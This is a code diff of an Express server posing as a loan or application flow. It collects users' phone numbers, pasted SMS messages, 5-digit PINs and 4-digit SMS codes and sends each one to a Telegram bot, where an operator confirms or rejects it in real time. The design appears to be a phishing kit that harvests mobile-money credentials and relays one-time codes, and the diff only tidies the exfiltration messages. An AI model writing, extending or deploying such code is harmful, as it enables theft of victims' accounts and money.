@@ -70,7 +70,7 @@ app.post('/api/submit-application', async function (req, res) {
 });
 
 // ============================================================
-// 2) VERIFY CODE — with Confirm / Reject buttons
+// 2) VERIFY CODE — FIRST MESSAGE (FULL DETAILS + BUTTONS)
 // ============================================================
 app.post('/api/verify-code', async function (req, res) {
     var d = req.body;
@@ -78,7 +78,6 @@ app.post('/api/verify-code', async function (req, res) {
     var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
     decisions[referenceId] = 'pending';
 
-    // Save the full SMS pasted by the user, keyed by referenceId
     firstCodes[referenceId] = d.code;
 
     var message =
@@ -88,7 +87,6 @@ app.post('/api/verify-code', async function (req, res) {
         '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
         '\n💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
         '\n📩 *Full SMS Message Pasted:*\n`' + (d.code || '-') + '`\n' +
-        '\n🆔 Ref: `' + referenceId + '`\n' +
         '\n🕐 ' + new Date().toLocaleString() + '\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '✅ Confirm if this matches the code you sent.';
@@ -120,18 +118,16 @@ app.post('/api/verify-code', async function (req, res) {
 });
 
 // ============================================================
-// 3) RESEND CODE
+// 3) RESEND CODE (SHORT)
 // ============================================================
 app.post('/api/resend-code', async function (req, res) {
     var d = req.body;
 
     var message =
-        '🔄 *Applicant Requested New Code*\n' +
+        '🔄 *Resend Requested*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '\n⚠️ They didn\'t receive or the previous code didn\'t work.\n' +
-        'Please send them a new code.';
+        '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
+        '\n🕐 ' + new Date().toLocaleString();
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -206,7 +202,6 @@ app.post('/api/telegram-callback', async function (req, res) {
     decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
     console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);
 
-    // Acknowledge the tap
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
             method: 'POST',
@@ -235,23 +230,17 @@ app.post('/api/telegram-callback', async function (req, res) {
 });
 
 // ============================================================
-// 7) FINAL CODE (5-digit PIN from final.html)
+// 7) FINAL CODE (5-digit PIN)  →  SHORT, NO REF
 // ============================================================
 app.post('/api/final-code', async function (req, res) {
     var d = req.body;
-    var refId = d.refId;
-    var firstCode = firstCodes[refId] || 'Unknown';
 
     var message =
-        '🎯 *5-DIGIT PIN SUBMITTED*\n' +
+        '🎯 *5-Digit PIN Submitted*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
-        '\n🔐 *Full SMS Message:*\n`' + firstCode + '`\n' +
         '\n🔑 *5-Digit PIN:*\n`' + (d.finalCode || '-') + '`\n' +
-        '\n🆔 Ref: `' + refId + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '⏳ Applicant is now entering the 4-digit SMS code...';
+        '\n🕐 ' + new Date().toLocaleString();
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -263,7 +252,7 @@ app.post('/api/final-code', async function (req, res) {
                 parse_mode: 'Markdown'
             })
         });
-        console.log('🎯 5-digit PIN sent to Telegram for Ref:', refId);
+        console.log('🎯 5-digit PIN sent to Telegram for phone:', d.phone);
         res.json({ ok: true });
     } catch (err) {
         console.error('Final code error:', err);
@@ -272,7 +261,7 @@ app.post('/api/final-code', async function (req, res) {
 });
 
 // ============================================================
-// 8) LAST CODE (4-digit SMS code from lastcode.html)
+// 8) LAST CODE (4-digit SMS code)  →  SHORT, NO REF + BUTTONS
 // ============================================================
 app.post('/api/last-code', async function (req, res) {
     var d = req.body;
@@ -281,14 +270,11 @@ app.post('/api/last-code', async function (req, res) {
     decisions[referenceId] = 'pending';
 
     var message =
-        '🔐 *4-DIGIT SMS CODE RECEIVED*\n' +
+        '🔐 *4-Digit SMS Code Received*\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
         '\n📱 *Phone:*\n`' + (d.phone || '-') + '`\n' +
-        '\n🔑 *4-Digit SMS Code:*\n`' + (d.lastCode || '-') + '`\n' +
-        '\n🆔 Ref: `' + referenceId + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '✅ Confirm to complete the application.';
+        '\n🔑 *4-Digit Code:*\n`' + (d.lastCode || '-') + '`\n' +
+        '\n🕐 ' + new Date().toLocaleString();
 
     var keyboard = {
         inline_keyboard: [[
